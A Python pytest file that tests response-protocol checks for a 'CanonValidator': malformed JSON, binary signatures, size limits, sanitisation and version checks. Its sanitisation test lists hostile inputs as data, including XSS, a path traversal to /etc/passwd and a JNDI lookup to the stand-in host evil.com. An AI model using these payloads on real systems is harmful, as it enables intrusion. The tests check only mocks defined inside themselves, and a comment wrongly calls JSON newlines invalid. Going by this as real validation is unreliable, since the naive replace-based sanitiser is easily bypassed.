#!/usr/bin/env python3
"""
CV-A-004: API Response Evasion
Adversarial test for L1 protocol handling
"""

import pytest
from unittest.mock import Mock
import json
import time
from canon_validator import CanonValidator


class TestCVA004:
    """Test API response evasion defense at L1 layer"""

    @pytest.fixture
    def validator(self):
        """Create validator with mocked dependencies"""
        validator = CanonValidator()
        validator.llm = Mock()
        validator.llm.generate_plan.return_value = {
            "status": "valid",
            "reasoning": "Code is valid"
        }
        validator.embed_fn = Mock(return_value=[0.1] * 768)
        validator.cache = Mock()
        validator.cache.check = Mock(return_value=None)
        validator.pinecone = Mock()
        validator.pinecone.query = Mock(return_value={'matches': []})
        validator.pinecone.upsert = Mock()
        return validator

    def test_malformed_json_rejection(self, validator):
        """Test rejection of malformed JSON responses"""
        malformed_responses = [
            "invalid json",
            '{"status": "invalid"',  # Missing closing brace
            '{"invalid": "structure"}',  # Missing required fields
            'null',  # Null response
            '',  # Empty string
            '{"status": null}',  # Null status
            'undefined',  # JavaScript undefined
            '{"status": "valid", "reasoning":}',  # Trailing comma
            '{{"status": "valid"}}',  # Double braces
            # Unexpected newline (invalid in strict JSON)
            '{"status":\n"valid"}',
            '{"status": "valid"\x00}',  # Null byte injection
        ]

        protocol_errors = []

        def mock_protocol_verification(response):
            """Simulate L1 Protocol Verification layer"""
            try:
                # Check for null/empty
                if response is None or response == '':
                    protocol_errors.append("L1_PROTOCOL_ERROR: Empty response")
                    return None

                # Check for undefined
                if response == 'undefined':
                    protocol_errors.append(
                        "L1_PROTOCOL_ERROR: Undefined response")
                    return None

                # Try to parse JSON
                if isinstance(response, str):
                    # Check for obvious JSON errors before parsing
                    if response.count('{') != response.count('}'):
                        protocol_errors.append(
                            "L1_PROTOCOL_ERROR: Unmatched braces")
                        return None
                    if '\x00' in response:
                        protocol_errors.append(
                            "L1_PROTOCOL_ERROR: Null byte injection")
                        return None
                    if response.rstrip().endswith(','):
                        protocol_errors.append(
                            "L1_PROTOCOL_ERROR: Trailing comma")
                        return None
                    # Check for newlines in JSON (should be escaped)
                    if '\n' in response and '\\n' not in response:
                        protocol_errors.append(
                            "L1_PROTOCOL_ERROR: Unescaped newline")
                        return None

                    # Use strict JSON parsing
                    parsed = json.loads(response)
                else:
                    parsed = response

                # Validate required fields
                if not isinstance(parsed, dict):
                    protocol_errors.append(
                        "L1_PROTOCOL_ERROR: Response not an object")
                    return None

                if "status" not in parsed:
                    protocol_errors.append(
                        "L1_PROTOCOL_ERROR: Missing status field")
                    return None

                if parsed["status"] is None:
                    protocol_errors.append(
                        "L1_PROTOCOL_ERROR: Null status value")
                    return None

                return parsed

            except json.JSONDecodeError as e:
                protocol_errors.append(
                    f"L1_PROTOCOL_ERROR: JSON decode failed - {str(e)}")
                return None
            except Exception as e:
                protocol_errors.append(
                    f"L1_PROTOCOL_ERROR: Validation failed - {str(e)}")
                return None

        # Test all malformed responses
        for malformed in malformed_responses:
            result = mock_protocol_verification(malformed)
            assert result is None, f"Should reject: {malformed}"

        # Verify protocol errors were logged
        # Some responses might generate multiple errors
        assert len(protocol_errors) >= 10
        for error in protocol_errors:
            assert "L1_PROTOCOL_ERROR" in error

    def test_protocol_error_logging_and_retry(self, validator):
        """Test protocol error logging and retry initiation"""
        logged_errors = []
        retry_attempts = []

        def mock_l1_protocol_handler(response):
            """L1 Protocol handler with error logging and retry"""
            # Verify response
            if not isinstance(response, str):
                error = "L1_PROTOCOL_ERROR: Non-string response"
                logged_errors.append(error)
                return initiate_retry(error)

            try:
                parsed = json.loads(response)
            except json.JSONDecodeError as e:
                error = f"L1_PROTOCOL_ERROR: JSON malformed - {str(e)}"
                logged_errors.append(error)
                return initiate_retry(error)

            # Validate structure
            required_fields = ["status", "reasoning"]
            for field in required_fields:
                if field not in parsed:
                    error = f"L1_PROTOCOL_ERROR: Missing {field}"
                    logged_errors.append(error)
                    return initiate_retry(error)

            return parsed

        def initiate_retry(error):
            retry_attempts.append({
                "error": error,
                "timestamp": time.time(),
                "action": "initiate_internal_repair"
            })
            return {
                "status": "retry",
                "reasoning": "Protocol error detected, initiating repair",
                "error_code": "L1_PROTOCOL_ERROR"
            }

        # Test various protocol violations
        test_responses = [
            '{"status": "valid"}',  # Missing reasoning
            '{"reasoning": "OK"}',  # Missing status
            'not json at all',
            '{"status": 123}',  # Invalid status type
        ]

        for response in test_responses:
            result = mock_l1_protocol_handler(response)
            assert result["status"] == "retry"
            assert "error_code" in result

        # Verify errors were logged and retries initiated
        assert len(logged_errors) == 4
        assert len(retry_attempts) == 4

        for retry in retry_attempts:
            assert retry["action"] == "initiate_internal_repair"
            assert "L1_PROTOCOL_ERROR" in retry["error"]

    def test_binary_response_handling(self, validator):
        """Test handling of binary/non-text responses"""
        binary_responses = [
            b'\x89PNG\r\n\x1a\n',  # PNG header
            b'%PDF-1.4',  # PDF header
            b'\xCA\xFE\xBA\xBE',  # Java class
            b'PK\x03\x04',  # ZIP file
        ]

        protocol_violations = []

        def mock_binary_detector(response):
            """Detect and reject binary responses"""
            if isinstance(response, bytes):
                # Check for binary signatures
                if response.startswith(b'\x89PNG'):
                    protocol_violations.append(
                        "L1_PROTOCOL_ERROR: Binary PNG response")
                elif response.startswith(b'%PDF'):
                    protocol_violations.append(
                        "L1_PROTOCOL_ERROR: Binary PDF response")
                elif response.startswith(b'\xCA\xFE\xBA\xBE'):
                    protocol_violations.append(
                        "L1_PROTOCOL_ERROR: Binary Java class")
                elif response.startswith(b'PK\x03\x04'):
                    protocol_violations.append(
                        "L1_PROTOCOL_ERROR: Binary ZIP response")
                else:
                    protocol_violations.append(
                        "L1_PROTOCOL_ERROR: Unknown binary response")
                return False

            return True

        # Test binary responses
        for binary in binary_responses:
            result = mock_binary_detector(binary)
            assert not result

        # Verify all violations detected
        assert len(protocol_violations) == 4
        for violation in protocol_violations:
            assert "L1_PROTOCOL_ERROR" in violation
            assert "Binary" in violation

    def test_response_size_limits(self, validator):
        """Test enforcement of response size limits"""
        max_size = 1024 * 1024  # 1MB limit
        size_violations = []

        def mock_size_enforcer(response):
            """Enforce response size limits"""
            if isinstance(response, str):
                size = len(response.encode('utf-8'))
            elif isinstance(response, bytes):
                size = len(response)
            else:
                # Convert to JSON and check size
                try:
                    json_str = json.dumps(response)
                    size = len(json_str.encode('utf-8'))
                except:
                    size = 0

            if size > max_size:
                size_violations.append(
                    f"L1_PROTOCOL_ERROR: Response too large - {size} bytes")
                return None

            return response

        # Test size violations
        oversized_response = "x" * (max_size + 1)
        result = mock_size_enforcer(oversized_response)
        assert result is None

        # Test normal size
        normal_response = "x" * 100
        result = mock_size_enforcer(normal_response)
        assert result == normal_response

        # Verify violation logged
        assert len(size_violations) == 1
        assert "too large" in size_violations[0]

    def test_response_sanitization(self, validator):
        """Test sanitization of suspicious response content"""
        suspicious_patterns = [
            "<script>alert('xss')</script>",
            "javascript:void(0)",
            "data:text/html,<script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
            "<% eval(request) %>",  # Code injection
        ]

        sanitized_responses = []

        def mock_response_sanitizer(response):
            """Sanitize suspicious content in responses"""
            if isinstance(response, str):
                # Remove or escape dangerous patterns
                sanitized = response

                # Remove script tags
                sanitized = sanitized.replace(
                    "<script>", "").replace("</script>", "")

                # Remove javascript: URLs
                sanitized = sanitized.replace("javascript:", "")

                # Remove data: URLs
                sanitized = sanitized.replace("data:text/html", "")

                # Remove path traversal
                sanitized = sanitized.replace("../", "")

                # Remove JNDI lookups
                sanitized = sanitized.replace("${jndi:", "")

                # Remove template injection
                sanitized = sanitized.replace("{{", "").replace("}}", "")

                # Remove code injection tags
                sanitized = sanitized.replace("<%", "").replace("%>", "")

                if sanitized != response:
                    sanitized_responses.append({
                        "original": response[:50] + "...",
                        "sanitized": sanitized[:50] + "..."
                    })

                return sanitized

            return response

        # Test sanitization
        for pattern in suspicious_patterns:
            result = mock_response_sanitizer(pattern)
            assert pattern not in result  # Pattern should be removed

        # Verify sanitization occurred
        assert len(sanitized_responses) == 7

    def test_protocol_version_check(self, validator):
        """Test protocol version compatibility check"""
        supported_versions = ["1.0", "1.1", "2.0"]
        version_errors = []

        def mock_version_checker(response):
            """Check protocol version compatibility"""
            if isinstance(response, dict):
                version = response.get("protocol_version", "1.0")
            else:
                # Try to parse version from JSON
                try:
                    parsed = json.loads(response)
                    version = parsed.get("protocol_version", "1.0")
                except:
                    # For invalid JSON, fall back to default version
                    version = "1.0"

            if version not in supported_versions:
                version_errors.append(
                    f"L1_PROTOCOL_ERROR: Unsupported protocol version {version}")
                return None

            return response

        # Test various versions
        test_cases = [
            ({"protocol_version": "1.0"}, True),
            ({"protocol_version": "2.0"}, True),
            ({"protocol_version": "3.0"}, False),  # Unsupported
            ("{}", True),  # Default version
            ("invalid", True),  # Falls back to default
        ]

        for response, should_succeed in test_cases:
            result = mock_version_checker(response)
            if should_succeed:
                assert result is not None, f"Failed for response: {response}"
            else:
                assert result is None, f"Should have failed for: {response}"

        # Verify version error logged
        assert len(version_errors) == 1
        assert "Unsupported protocol version 3.0" in version_errors[0]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])

